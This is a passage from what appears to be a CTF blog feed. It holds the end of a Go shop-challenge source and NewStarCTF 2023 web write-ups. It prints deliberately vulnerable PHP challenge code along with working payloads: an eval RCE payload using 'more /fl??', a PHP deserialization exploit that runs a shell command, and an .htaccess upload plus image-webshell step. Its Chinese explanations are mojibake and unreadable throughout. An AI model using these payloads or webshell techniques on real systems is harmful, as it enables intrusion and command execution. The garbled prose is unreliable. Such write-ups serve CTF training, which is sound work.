punctuation">)</span>user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span>product<span class="token punctuation">.</span>Name<span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token function">int64</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"Sell %v * %v success"</span><span class="token punctuation">,</span> product<span class="token punctuation">.</span>Name<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"You don't have enough product"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">FlagHandler</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>s <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>user <span class="token operator">:=</span> users<span class="token punctuation">[</span>s<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span class="token punctuation">]</span>v<span class="token punctuation">,</span> ok <span class="token operator">:=</span> user<span class="token punctuation">.</span>Items<span class="token punctuation">[</span><span class="token string">"Flag"</span><span class="token punctuation">]</span><span class="token keyword">if</span> <span class="token operator">!</span>ok <span class="token operator">||</span> v <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token punctuation">&#123;</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> <span class="token string">"You must buy &lt;code>flag&lt;/code> first"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>flag<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span>c<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> gin<span class="token punctuation">.</span>H<span class="token punctuation">&#123;</span><span class="token string">"message"</span><span class="token punctuation">:</span> fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">"Here is your flag: &lt;code>%s&lt;/code>"</span><span class="token punctuation">,</span> <span class="token function">string</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>secret <span class="token operator">:=</span> <span class="token function">make</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">byte</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>rand<span class="token punctuation">.</span><span class="token function">Read</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>tpl<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> template<span class="token punctuation">.</span><span class="token function">ParseFS</span><span class="token punctuation">(</span>fs<span class="token punctuation">,</span> <span class="token string">"public/index.html"</span><span class="token punctuation">)</span>store <span class="token operator">:=</span> cookie<span class="token punctuation">.</span><span class="token function">NewStore</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>r <span class="token operator">:=</span> gin<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">SetHTMLTemplate</span><span class="token punctuation">(</span>tpl<span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">Use</span><span class="token punctuation">(</span>sessions<span class="token punctuation">.</span><span class="token function">Sessions</span><span class="token punctuation">(</span><span class="token string">"gosession"</span><span class="token punctuation">,</span> store<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span>api <span class="token operator">:=</span> r<span class="token punctuation">.</span><span class="token function">Group</span><span class="token punctuation">(</span><span class="token string">"/api"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>api<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/info"</span><span class="token punctuation">,</span> InfoHandler<span class="token punctuation">)</span>api<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/buy"</span><span class="token punctuation">,</span> BuyHandler<span class="token punctuation">)</span>api<span class="token punctuation">.</span><span class="token function">POST</span><span class="token punctuation">(</span><span class="token string">"/sell"</span><span class="token punctuation">,</span> SellHandler<span class="token punctuation">)</span>api<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">,</span> FlagHandler<span class="token punctuation">)</span>api<span class="token punctuation">.</span><span class="token function">GET</span><span class="token punctuation">(</span><span class="token string">"/reset"</span><span class="token punctuation">,</span> ResetHandler<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>r<span class="token punctuation">.</span><span class="token function">StaticFileFS</span><span class="token punctuation">(</span><span class="token string">"/static/main.js"</span><span class="token punctuation">,</span> <span class="token string">"public/main.js"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">FS</span><span class="token punctuation">(</span>fs<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">StaticFileFS</span><span class="token punctuation">(</span><span class="token string">"/static/simple.css"</span><span class="token punctuation">,</span> <span class="token string">"public/simple.css"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span><span class="token function">FS</span><span class="token punctuation">(</span>fs<span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span><span class="token function">Run</span><span class="token punctuation">(</span><span class="token string">":8000"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂÆòÊñπwp‰ªãÁªçÔºö</p><p><img src="https://img-blog.csdnimg.cn/244ac8e4d87f4ccba56801b545fb6c11.png" alt="132"></p>]]></content>
      
      
      <categories>
          
          <category> Ëµõ‰∫ãWP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF-2023</title>
      <link href="/2023/10/06/NewStarCTF-2023/"/>
      <url>/2023/10/06/NewStarCTF-2023/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="week1-web"><a href="#week1-web" class="headerlink" title="week1-web"></a>week1-web</h2><h3 id="Ê≥ÑÊºèÁöÑÁßòÂØÜ"><a href="#Ê≥ÑÊºèÁöÑÁßòÂØÜ" class="headerlink" title="Ê≥ÑÊºèÁöÑÁßòÂØÜ"></a>Ê≥ÑÊºèÁöÑÁßòÂØÜ</h3><p><strong>robots.txt+<a href="http://www.zip/">www.zip</a></strong> ÂæóÂà∞flag„ÄÇ</p><h3 id="Begin-of-Upload"><a href="#Begin-of-Upload" class="headerlink" title="Begin of Upload"></a>Begin of Upload</h3><p><img src="https://img-blog.csdnimg.cn/0438e24d7ed54a9d8c4375b2347ea9a6.png" alt="1"><br>ËöÅÂâëËøûÊé•‰πãÂêéÊâæÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/5a0f93ee0a904b79b076100d8c03dfe9.png" alt="5"></p><h3 id="Begin-of-HTTP"><a href="#Begin-of-HTTP" class="headerlink" title="Begin of HTTP"></a>Begin of HTTP</h3><p>ÂÖàGET‰º†ÂÖ•ctf&#x3D;1ÔºåÂú®‰º†ÂÖ•secret&#x3D;1ÔºåÂèëÁé∞ÈúÄË¶Å‰º†ÂÖ•ÁâπÂÆöÂÄº<br><img src="https://img-blog.csdnimg.cn/c50cefbdd8e64ff3b2152524b7413d18.png" alt="1"><br>Êü•ÁúãÊ∫êÁ†ÅÊâæÂà∞secretÁöÑÂÄº<strong>n3wst4rCTF2023g00000d</strong><br><img src="https://img-blog.csdnimg.cn/7f5108c2a098479c9fb5b88b15f62d94.png" alt="5"><br>Êõ¥Êîπcookie‰∏≠ÁöÑpowerÁöÑÂÄºÔºåÊîπ‰∏∫<strong>ctfer</strong>„ÄÇ<br>Êõ¥ÊîπUAÂ§¥‰∏∫<strong>NewStarCTF2023</strong>„ÄÇ<br>Ê∑ªÂä†Referer‰∏∫<strong>newstarctf.com</strong>„ÄÇ<br>Ê∑ªÂä†X-Real-Ip‰∏∫<strong>127.0.0.1</strong>„ÄÇ<br>ÊãøÂà∞flag<br><img src="https://img-blog.csdnimg.cn/2c6c547e81d44b5eb3fb30ccff29ed98.png" alt="123"></p><h3 id="ErrorFlask"><a href="#ErrorFlask" class="headerlink" title="ErrorFlask"></a>ErrorFlask</h3><p>ËÆ©ÂÖ∂Êä•ÈîôÂç≥ÂèØÊãøÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/51afcb55d57645e291489cc2d73b1685.png" alt="456"></p><h3 id="Begin-of-PHP"><a href="#Begin-of-PHP" class="headerlink" title="Begin of PHP"></a>Begin of PHP</h3><p>ÁÆÄÂçïÂÆ°ËÆ°‰∏Ä‰∏ã‰ª£Á†Å</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 1=&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$flag1</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//Êï∞ÁªÑÁªïËøá</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 2=&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$flag2</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//Êï∞ÁªÑÁªïËøá</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 3=&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key4'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key4'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$flag3</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//Êï∞ÁªÑÁªïËøá</span><span class="token comment">//Âõ†‰∏∫strcmp()Êó†Ê≥ïÊØîËæÉÊï∞ÁªÑÔºåÂàôÊä•ÈîôÂπ∂ËøîÂõû0Ôºå0==0ÊàêÁ´ã„ÄÇ</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 4=&lt;br>"</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key5'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2023</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$flag4</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 4"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//ÁªïËøá!is_numeric</span><span class="token comment">//ÂêéÁºÄ%00</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"=Level 5=&lt;br>"</span><span class="token punctuation">;</span>    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ÈááÁî®ÂèòÈáèË¶ÜÁõñ -> flag5='.'</span>    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-zA-Z0-9]/"</span><span class="token punctuation">,</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$flag5</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nope,this is level 5"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!C!E!"></a>R!C!E!</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_v.a.l'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$password</span><span class="token operator">=</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'e_v.a.l'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"c4d038"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//ÁàÜÁ†¥Âá∫Êù•ÊòØ114514</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag|system|pass|cat|ls/i"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÊúÄÂêéÂ∞±ÊòØ</p><blockquote><p>**password&#x3D;114514&amp;e[v.a.l&#x3D;echo <code>more /fl??</code>;**<br><img src="https://img-blog.csdnimg.cn/9c50573ea17242a8a5b0d8ec5c77f872.png" alt="1"></p></blockquote><h3 id="EasyLogin"><a href="#EasyLogin" class="headerlink" title="EasyLogin"></a>EasyLogin</h3><p>ÊâìÂºÄÂ∞±ÊòØ‰∏Ä‰∏™ÁôªÂΩïÊ°Ü<br>Â∞ùËØïadminÂº±ÂØÜÁ†Å000000ÊàêÂäüÁôªÂΩïÈÄöËøáÊü•ÁúãburpÁöÑËÆ∞ÂΩïÂèëÁé∞302Ë∑≥ËΩ¨ÔºåÂ≠òÂú®flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/b2b750f96f9645d28a39e9f346dfd175.png" alt="2"></p><h2 id="week2-web"><a href="#week2-web" class="headerlink" title="week2-web"></a>week2-web</h2><p>Êåë‰∏Ä‰∫õÈáçË¶ÅÁöÑÂÜôÂêß„ÄÇ„ÄÇ„ÄÇ</p><h3 id="UnserializeÔºü"><a href="#UnserializeÔºü" class="headerlink" title="UnserializeÔºü"></a>UnserializeÔºü</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Maybe you need learn some knowledge about deserialize?</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">evil</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token comment">//ËøôÈáåÁöÑcmdÊòØÁßÅÊúâÂ±ûÊÄß</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/cat|tac|more|tail|base/i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            @<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'unser'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>privateÂèçÂ∫èÂàóÂåñÂêéÊòØ%00(Á±ªÂêç)%00(ÂèòÈáèÂêç)ÔºåprotectÊòØ%00*%00(ÂèòÈáèÂêç)</p></blockquote><p>exp</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">evil</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">evil</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">cmd</span><span class="token operator">=</span><span class="token string double-quoted-string">"nl /th1s_1s_fffflllll4444aaaggggg"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h3><p>Êñá‰ª∂‰∏ä‰º†„ÄÅ<code>.htaccessÊñá‰ª∂</code><br>ÂÖà‰∏ä‰º†.htaccessÊñá‰ª∂<br><img src="https://img-blog.csdnimg.cn/06c6774f41e748d3937afeb063413849.png" alt="123"></p><p>Âú®‰∏ä‰º†ÂõæÁâáÈ©¨<br><img src="https://img-blog.csdnimg.cn/d6feb5d5e82246a686a979196cfb1fcf.png" alt="123"><br>Âç≥ÂèØÊàêÂäüÂëΩ‰ª§ÊâßË°å</p><h3 id="R-C-E-1"><a href="#R-C-E-1" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h3><p>.gitÊ∫êÁ†ÅÊ≥ÑÈú≤<br><img src="https://img-blog.csdnimg.cn/94e16be6682f42139c3071d6964ebc59.png" alt="456"><br>Êü•Áúãbo0g1pop.phpÊñá‰ª∂</p><pre class="line-numbers language-php" 